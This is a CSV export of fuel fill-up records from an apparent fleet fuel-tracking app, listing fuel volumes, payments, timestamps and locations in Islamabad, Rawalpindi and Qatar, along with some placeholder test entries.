id,fuel_filled,amount_paid,driver_name,location,fuel_supervisor_name,fill_up_date,image,created_at,updated_at,device_id,module_id,payment_method_id,use_case_id,customer_id,status_id,automated_entry
165,"51.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:51:57.324351+00,"",2022-02-28 10:52:27.895211+00,2022-02-28 10:52:27.895223+00,577,1,2017,1,9,"0",1
276,59.08,"0.00",,,,2022-05-13 11:23:11+00,"",2022-05-13 11:23:25.734333+00,2022-05-13 11:23:25.734342+00,362,1,2017,1,123,1,1
125,15.81,"0.00",,"Al Wakrah, 1391, Qatar",,2022-02-18 14:59:02+00,"",2022-02-18 14:59:21.016345+00,2022-02-18 14:59:21.016362+00,362,1,2017,1,123,1,1
100,14.62,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-16 06:22:39.485534+00,"",2022-02-16 06:23:02.380951+00,2022-02-16 06:23:02.380965+00,536,1,2017,1,9,"0",1
101,"2658.00","6999.00",nagina prod mirror,"196 Street 1, I-10/3 I 10/3 I-10, Islamabad, Islamabad Capital Territory, Pakistan",prod mirror,2022-02-16 07:23:59+00,avatars/IMG-20220216-WA0010.jpg,2022-02-16 07:24:17.206604+00,2022-02-16 07:24:17.20663+00,536,1,2020,1,9,"0",
106,14.62,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:20:38.284172+00,"",2022-02-18 05:21:13.480599+00,2022-02-18 05:21:13.480611+00,536,1,2017,1,9,"0",1
107,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 05:22:04.587138+00,"",2022-02-18 05:22:32.296449+00,2022-02-18 05:22:32.296462+00,536,1,2017,1,9,"0",1
108,12.75,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:25:18.005307+00,"",2022-02-18 05:25:42.543542+00,2022-02-18 05:25:42.543556+00,536,1,2017,1,9,"0",1
109,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 05:26:26.538427+00,"",2022-02-18 05:26:40.188127+00,2022-02-18 05:26:40.18814+00,536,1,2017,1,9,"0",1
110,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:27:12.020518+00,"",2022-02-18 05:27:34.730628+00,2022-02-18 05:27:34.73064+00,536,1,2017,1,9,"0",1
111,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:27:57.367216+00,"",2022-02-18 05:28:07.83678+00,2022-02-18 05:28:07.836795+00,536,1,2017,1,9,"0",1
112,"15.30","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:39:51.174118+00,"",2022-02-18 11:40:11.995551+00,2022-02-18 11:40:11.995568+00,536,1,2017,1,9,"0",1
113,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 11:41:09.477172+00,"",2022-02-18 11:41:36.688839+00,2022-02-18 11:41:36.688851+00,536,1,2017,1,9,"0",1
114,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:41:55.965197+00,"",2022-02-18 11:42:14.88204+00,2022-02-18 11:42:14.882053+00,536,1,2017,1,9,"0",1
115,16.15,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:53:29.797717+00,"",2022-02-18 11:53:52.566849+00,2022-02-18 11:53:52.566861+00,536,1,2017,1,9,"0",1
116,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 11:54:57.373684+00,"",2022-02-18 11:55:19.354484+00,2022-02-18 11:55:19.354496+00,536,1,2017,1,9,"0",1
117,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:55:43.149016+00,"",2022-02-18 11:56:10.724384+00,2022-02-18 11:56:10.724402+00,536,1,2017,1,9,"0",1
118,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:56:29.111577+00,"",2022-02-18 11:56:47.944296+00,2022-02-18 11:56:47.944307+00,536,1,2017,1,9,"0",1
119,"6.80","0.00",,"G-6/4, G-5, Blue Area, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:57:14.610919+00,"",2022-02-18 11:57:53.768992+00,2022-02-18 11:57:53.769005+00,536,1,2017,1,9,"0",1
120,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:58:22.592697+00,"",2022-02-18 11:59:06.809023+00,2022-02-18 11:59:06.809061+00,536,1,2017,1,9,"0",1
121,"15.30","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:22:57.585618+00,"",2022-02-18 12:23:13.354176+00,2022-02-18 12:23:13.354195+00,536,1,2017,1,9,"0",1
122,"17.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:51:34.065482+00,"",2022-02-18 12:51:46.980488+00,2022-02-18 12:51:46.980505+00,536,1,2017,1,9,"0",1
123,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 12:53:01.454151+00,"",2022-02-18 12:53:50.30023+00,2022-02-18 12:53:50.300241+00,536,1,2017,1,9,"0",1
124,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:53:47.711142+00,"",2022-02-18 12:54:12.709665+00,2022-02-18 12:54:12.709683+00,536,1,2017,1,9,"0",1
126,"13.60","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-02-18 23:17:52.625165+00,"",2022-02-18 23:18:22.455422+00,2022-02-18 23:18:22.455439+00,536,1,2017,1,9,"0",1
131,16.21,"0.00",,"Bu Samra, Ar Rayyan, 40466, Qatar",,2022-02-19 14:03:35+00,"",2022-02-19 14:04:16.607469+00,2022-02-19 14:04:16.60749+00,362,1,2017,1,123,1,1
138,19.83,"0.00",,"Al Furousiya Street, Baaya, Mehairja, Al Rayyan, Ar Rayyan, 93035, Qatar",,2022-02-21 02:16:21+00,"",2022-02-21 02:16:58.36137+00,2022-02-21 02:16:58.361381+00,362,1,2017,1,123,1,1
139,47.27,"0.00",,,,2022-02-22 10:35:41+00,"",2022-02-22 10:35:59.89576+00,2022-02-22 10:35:59.895776+00,362,1,2017,1,123,1,1
140,47.85,"0.00",,,,2022-02-24 11:00:36+00,"",2022-02-24 11:01:03.839512+00,2022-02-24 11:01:03.839528+00,362,1,2017,1,123,1,1
141,20.79,"0.00",,"Al Rayyan, Ar Rayyan, 40466, Qatar",,2022-02-24 14:49:28+00,"",2022-02-24 14:50:05.363916+00,2022-02-24 14:50:05.36393+00,362,1,2017,1,123,1,1
142,"20.90","0.00",,,,2022-02-25 14:41:15+00,"",2022-02-25 14:41:36.279259+00,2022-02-25 14:41:36.279271+00,362,1,2017,1,123,1,1
143,34.57,"0.00",,,,2022-02-27 02:57:34+00,"",2022-02-27 02:57:45.896794+00,2022-02-27 02:57:45.896803+00,362,1,2017,1,123,1,1
127,"27.20","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-19 07:22:48.443505+00,"",2022-02-19 07:23:21.567593+00,2022-02-19 07:23:21.567611+00,552,1,2017,1,9,"0",1
137,"788.00","588.00",naggooooooooo,"463 Dhoke Kala Khan Rd, Awan Colony Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",bb,2022-02-20 12:02:22+00,avatars/Screenshot_20220220_113807_com.instagram.android.jpg,2022-02-20 12:03:48.826689+00,2022-02-20 12:03:48.826716+00,140,1,2019,1,9,"0",
144,"6700.00","6700.00",final,"M33V+445, Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",nagina,2022-02-28 01:31:07+00,avatars/JPEG_20220228_063111_3465874854673083407.jpg,2022-02-28 01:31:42.43874+00,2022-02-28 01:31:42.43876+00,535,1,2019,1,9,"0",
277,17.96,"0.00",,"Al Rayyan, Qatar",,2022-05-14 08:47:51+00,"",2022-05-14 08:48:13.584874+00,2022-05-14 08:48:13.584885+00,362,1,2017,1,123,1,1
278,16.41,"0.00",,"Al Shahama Street, Bani Hajer, Al Rayyan, 90089, Qatar",,2022-05-14 09:00:01+00,"",2022-05-14 09:00:16.850362+00,2022-05-14 09:00:16.850376+00,362,1,2017,1,123,1,1
148,"30.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-28 02:57:33.760455+00,"",2022-02-28 02:58:10.132777+00,2022-02-28 02:58:10.132788+00,523,1,2017,1,196,1,1
279,58.79,"0.00",,,,2022-05-15 02:48:27+00,"",2022-05-15 02:48:54.739902+00,2022-05-15 02:48:54.739911+00,362,1,2017,1,123,1,1
280,16.11,"0.00",,,,2022-05-15 03:40:37+00,"",2022-05-15 03:41:01.894378+00,2022-05-15 03:41:01.894389+00,362,1,2017,1,123,1,1
281,22.55,"0.00",,"Street 1106, Al Rayyan, 40466, Qatar",,2022-05-15 05:33:09+00,"",2022-05-15 05:33:37.514174+00,2022-05-15 05:33:37.514184+00,362,1,2017,1,123,1,1
282,"16.90","0.00",,"Umm Salal, Qatar",,2022-05-15 16:29:12+00,"",2022-05-15 16:29:36.042317+00,2022-05-15 16:29:36.042328+00,362,1,2017,1,123,1,1
283,"16.40","0.00",,"Al Rayyan, 40466, Qatar",,2022-05-15 17:17:32+00,"",2022-05-15 17:18:06.175111+00,2022-05-15 17:18:06.175124+00,362,1,2017,1,123,1,1
284,38.77,"0.00",,,,2022-05-17 02:56:33+00,"",2022-05-17 02:56:53.746872+00,2022-05-17 02:56:53.746886+00,362,1,2017,1,123,1,1
285,"46.00","0.00",,"Viva Bahriya, Doha, Qatar",,2022-05-22 05:17:06+00,"",2022-05-22 05:17:31.912347+00,2022-05-22 05:17:31.912358+00,415,1,2017,1,9,1,1
286,"10.00","20.00",Test Driver PVT,"7G8R+FQ3, Doha, Qatar",abc,2022-05-25 00:57:38+00,avatars/415_rDJuLfN.jpeg,2022-05-25 00:58:19.505669+00,2022-05-25 00:58:19.505696+00,415,1,2020,1,9,1,
287,"16.40","0.00",,"Umm Salal, Qatar",,2022-05-28 16:15:44+00,"",2022-05-28 16:15:49.112935+00,2022-05-28 16:15:49.112948+00,362,1,2017,1,123,1,1
288,19.53,"0.00",,,,2022-05-29 03:06:39+00,"",2022-05-29 03:06:41.312059+00,2022-05-29 03:06:41.312069+00,362,1,2017,1,123,1,1
289,49.41,"0.00",,,,2022-05-29 11:22:29+00,"",2022-05-29 11:22:30.344412+00,2022-05-29 11:22:30.344423+00,362,1,2017,1,123,1,1
290,27.05,"0.00",,"Pearl Boulevard, Abraj Quartier, Doha, 23619, Qatar",,2022-06-08 07:23:10.776181+00,"",2022-06-08 07:23:12.035971+00,2022-06-08 07:23:12.035981+00,446,1,2017,1,146,1,1
291,"44.00","0.00",,"Al Rayyan, Qatar",,2022-06-08 07:40:42.394162+00,"",2022-06-08 07:40:43.797309+00,2022-06-08 07:40:43.797325+00,446,1,2017,1,146,1,1
292,"45.00","0.00",,"Al Ebb Street, Al Daayen, 24685, Qatar",,2022-06-08 07:56:49.869909+00,"",2022-06-08 07:56:51.320476+00,2022-06-08 07:56:51.320487+00,446,1,2017,1,146,1,1
293,"45.00","0.00",,,,2022-06-08 08:12:57+00,"",2022-06-08 08:12:57.383832+00,2022-06-08 08:12:57.383843+00,446,1,2017,1,146,1,1
294,"45.00","0.00",,,,2022-06-08 08:29:16+00,"",2022-06-08 08:29:17.475278+00,2022-06-08 08:29:17.475288+00,446,1,2017,1,146,1,1
295,"45.00","0.00",,,,2022-06-08 08:53:16+00,"",2022-06-08 08:53:17.061219+00,2022-06-08 08:53:17.061229+00,446,1,2017,1,146,1,1
296,"45.00","0.00",,,,2022-06-08 09:32:16+00,"",2022-06-08 09:32:17.420636+00,2022-06-08 09:32:17.420646+00,446,1,2017,1,146,1,1
297,"45.00","0.00",,"Pearl Boulevard, Abraj Quartier, Doha, 23619, Qatar",,2022-06-08 10:04:51.132507+00,"",2022-06-08 10:04:52.549531+00,2022-06-08 10:04:52.549543+00,446,1,2017,1,146,1,1
298,"28.70","0.00",,"Abraj Bay Tower 3, Abraj Street, Abraj Quartier, Doha, Qatar",,2022-07-24 10:18:11.735486+00,"",2022-07-24 10:18:13.110331+00,2022-07-24 10:18:13.110341+00,149,1,2017,1,9,"0",1
299,11.55,"0.00",,,,2022-07-24 10:19:48+00,"",2022-07-24 10:19:48.545741+00,2022-07-24 10:19:48.54575+00,149,1,2017,1,9,"0",1
300,11.55,"0.00",,,,2022-07-24 10:21:44+00,"",2022-07-24 10:21:45.001879+00,2022-07-24 10:21:45.001894+00,149,1,2017,1,9,"0",1
246,"48.70","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-04-25 11:44:08.713265+00,"",2022-04-25 11:44:33.914888+00,2022-04-25 11:44:33.914898+00,630,1,2017,1,146,"0",1
301,"41.00","0.00",,"Viva Bahriya Tower 6, Viva Bahriya Drive, Medina Centrale, Doha, Qatar",,2022-08-07 11:24:03+00,"",2022-08-07 11:24:15.832765+00,2022-08-07 11:24:15.832777+00,415,1,2017,1,9,1,1
303,"43.00","322.00",vdfc,vdcr,dfcx,2022-08-12 14:19:21+00,"",2022-08-12 14:19:46.624398+00,2022-08-12 14:19:46.624408+00,596,1,2017,1,146,1,
304,"4532.00","5234324.00",vercsxred,vcewdxwe,vfcrd,2022-08-09 14:38:18+00,"",2022-08-12 14:40:20.070583+00,2022-08-12 14:40:20.070594+00,614,1,2020,1,146,1,
305,"2.00","5.00",A,I10,a,2022-08-15 11:21:19+00,"",2022-08-15 11:24:08.305799+00,2022-08-15 11:24:08.30581+00,734,1,2017,1,146,1,
306,"46.50","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-08-29 13:58:38+00,"",2022-08-29 13:58:43.01407+00,2022-08-29 13:58:43.01408+00,415,1,2017,1,9,1,1
307,"20.00","2000.00",Abc,blue area,Xyz,2022-08-30 10:33:42+00,"",2022-08-30 10:35:56.1785+00,2022-08-30 10:35:56.178509+00,726,1,2017,1,146,1,
309,"5.00","0.00",,"Abraj Bay Tower 3, Abraj Street, Abraj Quartier, Doha, Qatar",,2022-09-08 13:02:25.132408+00,"",2022-09-08 13:02:27.118456+00,2022-09-08 13:02:27.118466+00,678,1,2017,1,9,1,1
310,"8.30","0.00",,,,2022-09-08 13:04:09+00,"",2022-09-08 13:04:10.105901+00,2022-09-08 13:04:10.10591+00,678,1,2017,1,9,1,1
302,"43.00","432.00",vcdxs,rfre,vfcdsx,2022-08-11 14:17:54+00,"",2022-08-12 14:18:02.863364+00,2022-08-12 14:18:02.863381+00,656,1,2020,1,146,"0",
149,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:28:30.16449+00,"",2022-02-28 09:28:56.764888+00,2022-02-28 09:28:56.764897+00,577,1,2017,1,9,"0",1
150,"42.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:51:07.334027+00,"",2022-02-28 09:51:30.701186+00,2022-02-28 09:51:30.701197+00,577,1,2017,1,9,"0",1
151,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:51:56.337975+00,"",2022-02-28 09:52:26.552404+00,2022-02-28 09:52:26.552414+00,577,1,2017,1,9,"0",1
152,"60.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:19:17.155068+00,"",2022-02-28 10:19:32.665763+00,2022-02-28 10:19:32.665772+00,577,1,2017,1,9,"0",1
153,"57.60","0.00",,"Islamabad, Punjab",,2022-02-28 10:24:20.362276+00,"",2022-02-28 10:24:36.665297+00,2022-02-28 10:24:36.665312+00,577,1,2017,1,9,"0",1
154,"63.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:25:52.130597+00,"",2022-02-28 10:26:04.128062+00,2022-02-28 10:26:04.128076+00,577,1,2017,1,9,"0",1
155,"48.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:32:20.195514+00,"",2022-02-28 10:32:33.392231+00,2022-02-28 10:32:33.392242+00,577,1,2017,1,9,"0",1
156,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:33:47.214487+00,"",2022-02-28 10:34:01.865097+00,2022-02-28 10:34:01.865108+00,577,1,2017,1,9,"0",1
157,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:34:33.322297+00,"",2022-02-28 10:35:00.090726+00,2022-02-28 10:35:00.090736+00,577,1,2017,1,9,"0",1
158,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:35:19.172141+00,"",2022-02-28 10:35:32.2547+00,2022-02-28 10:35:32.25471+00,577,1,2017,1,9,"0",1
174,526.14,"0.00",,"Pearl Boulevard, Unaizah 66",,2022-02-28 11:11:39.088537+00,"",2022-02-28 11:12:01.328238+00,2022-02-28 11:12:01.328248+00,544,1,2017,1,9,"0",1
181,"599.40","0.00",,Azghawa,,2022-02-28 12:17:03.185122+00,"",2022-02-28 12:17:32.214873+00,2022-02-28 12:17:32.214885+00,544,1,2017,1,9,"0",1
182,"599.40","0.00",,Jabal Thuaileb,,2022-02-28 12:33:12.473421+00,"",2022-02-28 12:33:34.240924+00,2022-02-28 12:33:34.240935+00,544,1,2017,1,9,"0",1
183,"599.40","0.00",,,,2022-02-28 12:49:24+00,"",2022-02-28 12:49:39.701481+00,2022-02-28 12:49:39.701489+00,544,1,2017,1,9,"0",1
184,"599.40","0.00",,,,2022-02-28 13:05:31+00,"",2022-02-28 13:06:00.138599+00,2022-02-28 13:06:00.138607+00,544,1,2017,1,9,"0",1
185,"599.40","0.00",,,,2022-02-28 13:21:46+00,"",2022-02-28 13:22:07.273081+00,2022-02-28 13:22:07.273091+00,544,1,2017,1,9,"0",1
186,"599.40","0.00",,,,2022-02-28 13:37:54+00,"",2022-02-28 13:38:10.844805+00,2022-02-28 13:38:10.844814+00,544,1,2017,1,9,"0",1
187,"599.40","0.00",,Unaizah 66,,2022-02-28 13:53:58.292442+00,"",2022-02-28 13:54:30.605811+00,2022-02-28 13:54:30.605821+00,544,1,2017,1,9,"0",1
188,559.44,"0.00",,"Mohammed Bin Thani Street 232, Fereej Bin Omran",,2022-02-28 14:11:32.218754+00,"",2022-02-28 14:12:03.01571+00,2022-02-28 14:12:03.015725+00,544,1,2017,1,9,"0",1
189,"599.40","0.00",,,,2022-02-28 14:27:54+00,"",2022-02-28 14:28:09.271512+00,2022-02-28 14:28:09.271521+00,544,1,2017,1,9,"0",1
190,"532.80","0.00",,"Lusail Street, Al Dafna 61",,2022-02-28 14:56:25.108009+00,"",2022-02-28 14:56:35.709976+00,2022-02-28 14:56:35.70999+00,544,1,2017,1,9,"0",1
191,"599.40","0.00",,Azghawa,,2022-02-28 15:10:56.404508+00,"",2022-02-28 15:11:06.018512+00,2022-02-28 15:11:06.018521+00,544,1,2017,1,9,"0",1
147,"5666.00","66.00",final,"M33V+445, Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",nagina,2022-02-28 02:28:34+00,avatars/JPEG_20220228_072856_4975703965641943180.jpg,2022-02-28 02:29:34.230291+00,2022-02-28 02:29:34.230326+00,535,1,2017,1,9,"0",
166,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:54:07.42105+00,"",2022-02-28 10:54:30.150161+00,2022-02-28 10:54:30.150171+00,577,1,2017,1,9,"0",1
167,"44.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:02:48.411736+00,"",2022-02-28 11:03:02.457429+00,2022-02-28 11:03:02.457443+00,577,1,2017,1,9,"0",1
168,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 11:05:20.028764+00,"",2022-02-28 11:05:34.876624+00,2022-02-28 11:05:34.876633+00,577,1,2017,1,9,"0",1
169,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:06:25.712239+00,"",2022-02-28 11:06:37.991019+00,2022-02-28 11:06:37.991029+00,577,1,2017,1,9,"0",1
170,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:07:30.001535+00,"",2022-02-28 11:07:58.197624+00,2022-02-28 11:07:58.197634+00,577,1,2017,1,9,"0",1
171,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:08:35.48518+00,"",2022-02-28 11:09:00.205398+00,2022-02-28 11:09:00.205408+00,577,1,2017,1,9,"0",1
172,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:09:41.83994+00,"",2022-02-28 11:10:00.922756+00,2022-02-28 11:10:00.922765+00,577,1,2017,1,9,"0",1
173,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:10:47.251591+00,"",2022-02-28 11:11:06.062562+00,2022-02-28 11:11:06.062571+00,577,1,2017,1,9,"0",1
175,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:12:00.183192+00,"",2022-02-28 11:12:28.774356+00,2022-02-28 11:12:28.774366+00,577,1,2017,1,9,"0",1
176,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:13:06.976113+00,"",2022-02-28 11:13:30.330138+00,2022-02-28 11:13:30.330149+00,577,1,2017,1,9,"0",1
177,"39.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:12:25.836502+00,"",2022-02-28 12:12:41.758526+00,2022-02-28 12:12:41.758536+00,577,1,2017,1,9,"0",1
178,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:12:52.053206+00,"",2022-02-28 12:13:23.127525+00,2022-02-28 12:13:23.12754+00,577,1,2017,1,9,"0",1
